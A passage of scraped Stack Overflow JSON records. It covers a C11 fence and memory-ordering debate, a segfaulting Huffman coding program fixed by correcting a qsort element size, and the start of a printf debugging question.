"https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449867129, "post_id": 34198660, "comment_id": 56208506, "body": "No I understand classical happens before; my problem is happens before has a very specific definition in the C11 spec and I can&#39;t convince myself it matches classical happens before.  But I think maybe I understand my confusion.  To me, because of the definite article, &quot;the value stored by side effect X&quot; reads like it must be the value stored in object M computed by A, otherwise I would expect to read &quot;a value stored by side effect X.&quot;  Is your interpretation that X can be any side effect storing any value, not just M?"}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "reply_to_user": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449869554, "post_id": 34198660, "comment_id": 56209665, "body": "No, <i>X</i> is stroring value into <code>a</code>(<i>M</i>) by <code>p1</code>. So your interpretation is correct. Probably you confused, that given read-read coherence is unrelated to arguing of happens-before relation between A* and <i>B</i>? It <i>uses</i> this relation."}, {"owner": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449871177, "post_id": 34198660, "comment_id": 56210321, "body": "I appreciate your patience, but I still don&#39;t see how it maps to my example.  First, coherence only really says anything about a single memory location (really, cache line).  The issue here is about multiple memory locations that might propagate at different speeds in a NUMA machine.  Second, the quoted language &quot;if a value computation A of an atomic object M happens before a value computation B&quot; only applies if A <i>happens before</i> B.  And in the peculiar definition of that term given by 5.1.2.3.18, I don&#39;t think any computation happens before any other in my example."}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "reply_to_user": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449872043, "post_id": 34198660, "comment_id": 56210643, "body": "<i>Happens-before</i> term is <b>universal</b>; after being proved it isn&#39;t binded to particular memory location. So, after proving <i>happens-before</i>  relation between <i>A</i> and <i>B</i> by using accesses to variable <code>b</code>, this fact can be used in <i>cache coherence</i> for variable <code>a</code>."}, {"owner": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449873277, "post_id": 34198660, "comment_id": 56211108, "body": "I don&#39;t think you can claim happens-before is universal in light of 5.1.2.4.18 which actually defines the term.  Moreover, by way of example, C++N3290 in 1.10.6 notes says: &quot;This states that the modification orders must respect the `happens before&#39; relationship... There is a separate order for each atomic object. There is no requirement that these can be combined into a single total order for all objects.&quot;  So that&#39;s at least one language with a very non-Lamport notion of happens before.  My question is about the perceived order of a=1 vs. b=1, not about two writes to the same location."}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "reply_to_user": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449875325, "post_id": 34198660, "comment_id": 56211926, "body": "<i>happens-before</i> relation is universal in sence that it doesn&#39;t binded to a particular location. Phrase <code>There is a separate order for each atomic object.</code> doesn&#39;t deny the requirement, that for <i>any</i> atomic variable <code>modification order must respect the happens-before relationship</code>. Your question is about concrete assertion garantee, term <i>preceived order</i> isn`t strictly defined by the standard."}, {"owner": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449881793, "post_id": 34198660, "comment_id": 56213637, "body": "But the assertion in my code can fail without violating happens before for any atomic object.  All three threads agree that a=1 happened after a=0 (initialization), and that b=1 happened after b=0.  Without violating the per-variable global modification ordered implied by coherence, it is possible for p2 to see a=1 before p3 does.  Since p1&#39;s write does not &quot;inter-thread happen before&quot; any other operation in the whole program, I don&#39;t know how C11 guarantees that p3 will see it by any particular point.  You could fix it by having p2 rewrite a=1 before the fence, but that&#39;s not my question."}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "reply_to_user": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449950818, "post_id": 34198660, "comment_id": 56230527, "body": "<code>per-variable global modification ordered implied by coherence</code> - cache coherence is not involved into global modification order garantee. Cache coherence implies, that whenever <code>p1</code> write has &quot;inter-thread happens-before&quot; or not, <b>if this write is perceived by the reading</b> (in <code>p2</code>), and <b>this reading is in happens-before relation with other reading</b> (in <code>p3</code>), then the <b>other reading will perceive this write</b>. Any NUMA machine has mechanisms for provide that garantee, and compiler is required to use this mechanism."}, {"owner": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449956955, "post_id": 34198660, "comment_id": 56232551, "body": "I took your advice and asked a <a href=\"http://stackoverflow.com/questions/34244647/what-does-happens-before-mean-in-the-c11-spec\">new question</a> about happens-before, albeit in the context of C++.  At least for C++, the comments suggested that &quot;if&quot; should be read as &quot;if an only if&quot; in the definition of happens before.  If we apply the same logic to C11 5.1.2.4/18, then the store in <code>p1</code> does not happen before any other evaluation in <code>p2</code> or <code>p3</code>, because it does not inter-thread happen before any other evaluation.  So that means the assertion can fail after all."}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "reply_to_user": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449962078, "post_id": 34198660, "comment_id": 56234005, "body": "You incorrectly read statement about cache coherence. It <b>doesn&#39;t imply that write in <code>p1</code> is in <i>happens-before</i> order with read in <code>p3</code></b>. It just say that read in <code>p3</code> will get what is written by <code>p1</code>. Nothing more above that. E.g., if you have another write in <code>p1</code> before given one, this write isn&#39;t garanteed to be seen by <code>p3</code>."}, {"owner": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449962870, "post_id": 34198660, "comment_id": 56234206, "body": "But the language you quote in 5.1.2.5/22 is prefixed with &quot;if a value computation A of an atomic object M happens before a value computation B of M.&quot;  So unless A happens before B, I don&#39;t see how that text is relevant."}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "reply_to_user": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449963502, "post_id": 34198660, "comment_id": 56234368, "body": "<code>A</code> is read in <code>p2</code>, <code>B</code> is read in <code>p3</code>. In one of your previous comment you said you understand that they are in happens-before relation (deduced from <code>b</code> variable&#39;s accesses and fences)."}], "tags": [], "owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "is_accepted": true, "score": 2, "last_activity_date": 1449776040, "last_edit_date": 1449776040, "creation_date": 1449741328, "answer_id": 34198660, "question_id": 34190774, "link": "https://stackoverflow.com/questions/34190774/possible-to-use-c11-fences-to-reason-about-writes-from-other-threads/34198660#34198660", "title": "Possible to use C11 fences to reason about writes from other threads?", "body": "<p>You forget <code>memory_order_acquire</code> fence in <code>p3</code>:</p>\n\n<pre><code>void\np3(void *_ignored)\n{\n  int register1 = 1;\n  if (atomic_load_explicit(&amp;b, memory_order_relaxed)) {\n    atomic_thread_fence(memory_order_acquire); // &lt;-- Here\n    register1 = atomic_load_explicit(&amp;a, memory_order_relaxed);\n  }\n  assert(register1 != 0);\n}\n</code></pre>\n\n<p>With this fence, loading <code>a</code> in <code>p2</code> will be in <em>happens-before</em> relation with loading <code>a</code> in <code>p3</code>.</p>\n\n<p>C11 standard garantees <em>read-read</em> coherence, which means that the loading in <code>p3</code> should observe <strong>same-or-subsequent modification</strong>, which is observed by the <em>happened-before</em> loading in <code>p2</code>. Because the loading in <code>p2</code> observes the store in <code>p1</code>, and no <em>subsequent</em> modifications of <code>a</code> is possible in your scenario, loading in <code>p3</code> should also observe storing in <code>p1</code>.</p>\n\n<p>So your assertion can never trigger.</p>\n\n<hr>\n\n<p><strong>References to the corresponded statements in the standard</strong>:</p>\n\n<blockquote>\n  <p>5.1.2.4 p.25: The execution of a program contains a data race if it contains two conflicting actions in different threads, at least one of which is <strong>not atomic</strong>, and neither happens before the other. Any such data race results in undefined behavior.</p>\n</blockquote>\n\n<p>So, <em>atomic</em> accesses cannot contain data race by definition.</p>\n\n<blockquote>\n  <p>5.1.2.4 p.22: ... if a value computation A of an atomic object M happens before a value computation B of M, and the value computed by A corresponds to the value stored by side effect X, then the value computed by B shall <strong>either equal the value computed by A, or be the value stored by side effect Y, where Y follows X in the modification order of M.</strong></p>\n</blockquote>\n\n<p>Next paragraph says, that this is <em>cache coherence garantee</em>. C++11 standard is more specific, and says about <em>read-read cache coherence</em> in similar wording.</p>\n"}], "owner": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 129, "favorite_count": 1, "accepted_answer_id": 34198660, "answer_count": 1, "score": 2, "last_activity_date": 1449827463, "creation_date": 1449702547, "last_edit_date": 1449827463, "question_id": 34190774, "link": "https://stackoverflow.com/questions/34190774/possible-to-use-c11-fences-to-reason-about-writes-from-other-threads", "title": "Possible to use C11 fences to reason about writes from other threads?", "body": "<p><a href=\"http://www.hpl.hp.com/techreports/Compaq-DEC/WRL-95-7.pdf\" rel=\"nofollow noreferrer\">Adve and Gharachorloo's report</a>, in Figure 4b, provides the following example of a program that exhibits unexpected behavior in the absence of sequential consistency:</p>\n\n<p><a href=\"https://i.stack.imgur.com/uGbn9.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/uGbn9.png\" alt=\"enter image description here\"></a></p>\n\n<p>My question is whether it is possible, using only C11 fences and <code>memory_order_relaxed</code> loads and stores, to ensure that register1, if written, will be written with the value 1.  The reason this might be hard to guarantee in the abstract is that P1, P2, and P3 could be at different points in a pathological NUMA network with the property that P2 sees P1's write before P3 does, yet somehow P3 sees P2's write very quickly.  The reason this might be hard to guarantee with respect to the C11 spec specifically is that P1's write to A and P2's read of A do not synchronize with each other, and therefore by paragraph 5.1.2.4.26 of the spec will result in undefined behavior.  Possibly I can sidestep the undefined behavior through relaxed atomic fetch/store, but I still don't know how to reason transitively about the order seen by P3.</p>\n\n<p>Below is a MWE attempting to solve the problem with fences, but I'm not sure if it is correct.  I'm specifically worried that the release fence is not good enough, because it won't flush p1's store buffer, just p2's.  However, it will answer my question if you can argue the assert will never fail just based on the C11 standard (as opposed to some other information one might have about a particular compiler and architecture).</p>\n\n<pre><code>#include &lt;assert.h&gt;\n#include &lt;stdatomic.h&gt;\n#include &lt;stddef.h&gt;\n#include &lt;threads.h&gt;\n\natomic_int a = ATOMIC_VAR_INIT(0);\natomic_int b = ATOMIC_VAR_INIT(0);\n\nvoid\np1(void *_ignored)\n{\n  atomic_store_explicit(&amp;a, 1, memory_order_relaxed);\n}\n\nvoid\np2(void *_ignored)\n{\n  if (atomic_load_explicit(&amp;a, memory_order_relaxed)) {\n    atomic_thread_fence(memory_order_release); // not good enough?\n    atomic_store_explicit(&amp;b, 1, memory_order_relaxed);\n  }\n}\n\nvoid\np3(void *_ignored)\n{\n  int register1 = 1;\n  if (atomic_load_explicit(&amp;b, memory_order_relaxed)) {\n    atomic_thread_fence(memory_order_acquire);\n    register1 = atomic_load_explicit(&amp;a, memory_order_relaxed);\n  }\n  assert(register1 != 0);\n}\n\nint\nmain()\n{\n  thrd_t t1, t2, t2;\n  thrd_create(&amp;t1, p1, NULL);\n  thrd_create(&amp;t2, p2, NULL);\n  thrd_create(&amp;t3, p3, NULL);\n  thrd_join(&amp;t1, NULL);\n  thrd_join(&amp;t2, NULL);\n  thrd_join(&amp;t3, NULL);\n}\n</code></pre>\n"}, {"tags": ["c", "segmentation-fault", "binary-tree", "huffman-code"], "comments": [{"owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "edited": false, "score": 2, "creation_date": 1449701932, "post_id": 34190582, "comment_id": 56127625, "body": "Some details ( trace prints, debugging runs, minimal test cases, compiler brand and settings ) might be useful to helpful minds ... at first glance, some function signatures might be a problem, specifically the array dimensions in formal parameters ( eg.<code>int arr[100]</code>in <code>void printCodes(Node* root, int arr[100], int top)</code> )."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1449702159, "post_id": 34190582, "comment_id": 56127710, "body": "Run your program in a debugger. At a minimum it will tell you where the seg fault is occuring."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1449702367, "post_id": 34190582, "comment_id": 56127796, "body": "Note: in <code>newQueue()</code>, the node(s) pointed to by <code>newQueue-&gt;array</code> is(are) not initialized."}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 0, "creation_date": 1449703784, "post_id": 34190582, "comment_id": 56128360, "body": "It&#39;s asking a lot to dump that much code into a question with very little information asking where your segmentation fault is. You need to do some debugging to narrow it down. You can&#39;t expect other people to do that work for you. The segmentation fault means you&#39;ve probably got a bad pointer somewhere."}, {"owner": {"reputation": 143, "user_id": 5422887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/36b5989aefca5ffd937a2b80f068c580?s=128&d=identicon&r=PG&f=1", "display_name": "akram1rekik", "link": "https://stackoverflow.com/users/5422887/akram1rekik"}, "edited": false, "score": 0, "creation_date": 1449705131, "post_id": 34190582, "comment_id": 56128878, "body": "segmentation fault line 237  return( a-&gt;frequency - b-&gt;frequency ); // second dereference using -&gt; notation gets the id"}], "answers": [{"tags": [], "owner": {"reputation": 2190, "user_id": 5226168, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e3761808b7533626771b59ad6ef9541?s=128&d=identicon&r=PG&f=1", "display_name": "Anders", "link": "https://stackoverflow.com/users/5226168/anders"}, "is_accepted": true, "score": 1, "last_activity_date": 1449724285, "creation_date": 1449724285, "answer_id": 34194142, "question_id": 34190582, "link": "https://stackoverflow.com/questions/34190582/huffman-with-c-segmentation-default-core-dumped/34194142#34194142", "title": "Huffman with C , segmentation default (core dumped)", "body": "<p>It is blowing up deep inside qsort, so it is a little tricky to debug. Try stopping in buildTree before calling qsort.</p>\n\n<p>For starters:</p>\n\n<pre><code>qsort(Q1-&gt;array, Q1-&gt;size, sizeof(int), cmpfunc);\n</code></pre>\n\n<p>Should be:</p>\n\n<pre><code>qsort(Q1-&gt;array, Q1-&gt;size, sizeof(Node *), cmpfunc);\n</code></pre>\n\n<p>On Linux x86_64, sizeof(int) is 4, but pointers are 8. This stopped the crash and I got some kind of output after that.</p>\n\n<p>I'd suggest carefully stepping through with printf or gdb one step at a time to make sure its all right each step.</p>\n"}], "owner": {"reputation": 143, "user_id": 5422887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/36b5989aefca5ffd937a2b80f068c580?s=128&d=identicon&r=PG&f=1", "display_name": "akram1rekik", "link": "https://stackoverflow.com/users/5422887/akram1rekik"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 112, "favorite_count": 0, "accepted_answer_id": 34194142, "answer_count": 1, "score": -1, "last_activity_date": 1449724285, "creation_date": 1449701713, "last_edit_date": 1449706361, "question_id": 34190582, "link": "https://stackoverflow.com/questions/34190582/huffman-with-c-segmentation-default-core-dumped", "title": "Huffman with C , segmentation default (core dumped)", "body": "<p>I tried to implement huffman algorithm with C using a binary tree and 2 queues :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdbool.h&gt;\n#define L 71/*Letters in the alphabet*/\n\ntypedef struct Node Node;\n\nstruct Node {\n\n    int frequency;\n    char letter;\n    Node *left, *right;\n};\n\ntypedef struct Queue Queue;\n\nstruct Queue {\n\n    int front, rear;\n    int size;\n    int capacity;\n    Node **array;\n};\n\nvoid readFile(char letterArray[L], int letterCount[L], const char* filename);\nvoid fill(int *letterCount);\nvoid findLowest(Node* leafNode, char letterArray[L], int letterCount[L]);\nchar findFrequency(int letterCount[L]);\nQueue* newQueue(int capacity);\nNode* newInternalNode(char letter, int f);\nvoid addHeapNode(Queue* Q, Node* HeapNode);\nvoid removeHeapNode(Queue* Heap, int indxToDel);\nvoid buildTree(char letterArray[L], int letterCount[L]);\nvoid printCodes(Node* root, int arr[100], int top);\nint isLeaf(Node* root);\nint cmpfunc (const void * item1, const void * item2);\nint isSizeOne(Queue* queue);\nint isEmpty(Queue* queue);\nint isFull(Queue* queue);\nvoid addLeaves(Queue *Q1, char letterArray[L], int letterCount[L]);\nvoid enQueue(Queue* Q, Node* item);\nNode* deQueue(Queue *Q);\nNode* findMin(Queue *Q1, Queue *Q2);\nNode* getFront(Queue *Q);\n\nvoid printArr(int arr[], int n, int frequency);\n\nint main(int argc, char const* argv[]) {\n\n    if (argc != 2) {\n        printf(\"Enter a file\");\n        return 1;\n    }\n    char letterArray[L] = {'\"', '\\'', '(', ')', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n                       ':', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q',\n                       'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i',\n                       'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };\n    int letterCount[L];\n    fill(letterCount);\n    readFile(letterArray, letterCount, argv[1]);\n    buildTree(letterArray, letterCount);\n    return 0;\n}\n\nQueue* newQueue(int capacity) {\n\n    Queue* newQueue = malloc(sizeof(Queue));\n    newQueue-&gt;front = newQueue-&gt;rear = -1;\n    newQueue-&gt;capacity = capacity;\n    newQueue-&gt;size = 0;\n    newQueue-&gt;array = (Node**) malloc(newQueue-&gt;capacity * sizeof(Node*));\n    return newQueue;\n}\n\nNode* newInternalNode(char letter, int f) {\n\n    Node* LeafNode = malloc(sizeof(Node));\n    LeafNode-&gt;frequency = f;\n    LeafNode-&gt;letter = letter;\n    LeafNode-&gt;left = LeafNode-&gt;right = NULL;\n    return LeafNode;\n}\n\nvoid fill(int *letterCount) {\n\n    int i;\n\n    for (i = 0; i &lt; L; i++) {\n        *letterCount = 0;\n        letterCount++;\n    }\n}\n\nvoid readFile(char letterArray[L], int letterCount[L], const char* filename) {\n\n    FILE *fp;\n    int c = 0;\n    int i;\n\n    fp = fopen(filename, \"r\");\n\n    if (fp == NULL) {\n        fprintf(stderr, \"failure\\n\");\n        exit(1);\n    }\n    for (;;) {\n        c = fgetc(fp);\n        if (feof(fp)) {\n            break;\n        }\n        for (i = 0; i &lt; L; i++) {\n            if (letterArray[i] == c) {\n                letterCount[i] += 1;\n            }\n        }\n    }\n    fclose(fp);\n}\n\nvoid addLeaves(Queue *Q1, char letterArray[L], int letterCount[L]) {\n\n    int i = 0;\n\n    for (i = 0; i &lt; L; i++) {\n        if (letterCount[i] &gt; 0) {\n            Node* LeafNode = malloc(sizeof(Node));\n            LeafNode-&gt;frequency = letterCount[i];\n            LeafNode-&gt;letter = letterArray[i];\n            LeafNode-&gt;left = LeafNode-&gt;right = NULL;\n            enQueue(Q1, LeafNode);\n        }\n    }\n}\n\nvoid buildTree(char letterArray[L], int letterCount[L]) {\n\n    int array[100];\n    int t = 0;\n    Node *left, *right, *top;\n    Queue *Q1, *Q2;\n    int size = 0;\n    Q1 = newQueue(L);\n    Q2 = newQueue(L);\n\n    addLeaves(Q1, letterArray, letterCount);\n    qsort(Q1-&gt;array, Q1-&gt;size, sizeof(int), cmpfunc);\n\n    // Run while Queues contain more than one node. Finally, first queue will\n    // be empty and second queue will contain only one node\n    while (!(isEmpty(Q1) &amp;&amp; isSizeOne(Q2))) {\n        // Step 3: Dequeue two nodes with the minimum frequency by examining\n        // the front of both queues\n        left = findMin(Q1, Q2);\n        right = findMin(Q1, Q2);\n        // Step 4: Create a new internal node with frequency equal to the sum\n        // of the two nodes frequencies. Enqueue this node to second queue.\n        top = newInternalNode('$', left-&gt;frequency+ right-&gt;frequency);\n        top-&gt;left = left;\n        top-&gt;right = right;\n        enQueue(Q2, top);\n        }\n        Node* root = (Node*)malloc(sizeof(Node));\n        root = deQueue(Q2);\n        printCodes(root, array, t);\n}\n\n// A utility function to check if size of given queue is 1\nint isSizeOne(Queue* queue)\n{\n    return queue-&gt;front == queue-&gt;rear &amp;&amp; queue-&gt;front != -1;\n}\n\n// A utility function to check if given queue is empty\nint isEmpty(Queue* queue)\n{\n    return queue-&gt;front == -1;\n}\n\n// A utility function to check if given queue is full\nint isFull(Queue* queue)\n{\n    return queue-&gt;rear == queue-&gt;capacity - 1;\n}\n\n// A utility function to add an item to queue\nvoid enQueue(Queue* Q, Node* item) {\n\n    if (isFull(Q)) return;\n    Q-&gt;array[++Q-&gt;rear] = item;\n    Q-&gt;size++;\n    if (Q-&gt;front == -1)\n        ++Q-&gt;front;\n}\n\n// A utility function to remove an item from queue\nNode* deQueue(Queue *Q) {\n    if (isEmpty(Q)) return NULL;\n    Node* temp = Q-&gt;array[Q-&gt;front];\n    if (Q-&gt;front == Q-&gt;rear)  // If there is only one item in queue\n        Q-&gt;front = Q-&gt;rear = -1;\n    else\n        ++Q-&gt;front;\n    return temp;\n}\n\n// A utility function to get from of queue\nNode* getFront(Queue *Q) {\n    if (isEmpty(Q)) return NULL;\n    return Q-&gt;array[Q-&gt;front];\n}\n\n/* A function to get minimum item from two queues */\nNode* findMin(Queue *Q1, Queue *Q2) {\n    // Step 3.a: If second queue is empty, dequeue from first queue\n    if (isEmpty(Q1)) {\n        return deQueue(Q2);\n    }\n\n    // Step 3.b: If first queue is empty, dequeue from second queue\n    if (isEmpty(Q2)) {\n        return deQueue(Q1);\n    }\n\n    // Step 3.c:  Else, compare the front of two queues and dequeue minimum\n    if (getFront(Q1)-&gt;frequency &lt; getFront(Q2)-&gt;frequency) {\n        return deQueue(Q1);\n    }\n\n    return deQueue(Q2);\n}\n\nint cmpfunc (const void * item1, const void * item2) {\n\n    struct Node *a = *(struct Node **)item1; // first dereference gets the pointer to the struct\n    struct Node *b = *(struct Node **)item2;\n    return( a-&gt;frequency - b-&gt;frequency ); // second dereference using -&gt; notation gets the id\n}\n\nvoid printCodes(Node* root, int arr[100], int top) {\n\n    if (root-&gt;left) {\n        arr[top] = 0;\n        printCodes(root-&gt;left, arr, top + 1);\n    }\n\n    if (root-&gt;right) {\n        arr[top] = 1;\n        printCodes(root-&gt;right, arr, top + 1);\n    }\n\n    if (isLeaf(root)) {\n        printf(\"'%c' : \", root-&gt;letter);\n        printArr(arr, top, root-&gt;frequency);\n        printf(\"\\n\");\n    }\n}\n\nint isLeaf(Node* root) {\n    return !(root-&gt;left) &amp;&amp; !(root-&gt;right);\n}\n\nvoid printArr(int arr[], int n, int frequency) {\n\n    int i;\n    for (i = 0; i &lt; n; ++i) {\n        printf(\"%1d\", arr[i]);\n    }\n    printf(\" (%d * %d)\", n, frequency);\n}\n</code></pre>\n\n<p>When I compile and execute this code I get this error :</p>\n\n<blockquote>\n  <p>Segmentation fault (core dumped)</p>\n  \n  <p>segmentation fault line 237 \n  return( a->frequency - b->frequency ); // >second dereference using -> >notation gets the id</p>\n</blockquote>\n\n<p>Any help will be greatly appreciated ^^</p>\n"}, {"tags": ["c", "debugging", "printf", "puts"], "comments": [{"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1449700925, "post_id": 34190250, "comment_id": 56127190, "body": "You should see a compiler warning from that line. Did you read it?"}, {"owner": {"reputation": 35, "user_id": 4331563, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-LFn4e8gQrDs/AAAAAAAAAAI/AAAAAAAAAGQ/dEioCWMAAns/photo.jpg?sz=128", "display_name": "Bil", "link": "https://stackoverflow.com/users/4331563/bil"}, "reply_to_user": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1449701878, "post_id": 34190250, "comment_id": 56127598, "body": "yea i know , i don&#39; want anything to be displayed , this instruction in particular prevented the bug , replace it with this if u want  =&gt; printf(&quot;&quot;,mm);"}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1449702532, "post_id": 34190250, "comment_id": 56127861, "body": "Take a look at the other warnings you&#39;re getting. They&#39;re probably related to the problem. Good code doesn&#39;t get any warnings."}, {"owner": {"reputation": 35, "user_id": 4331563, "user_type": "registered", "profile_image": 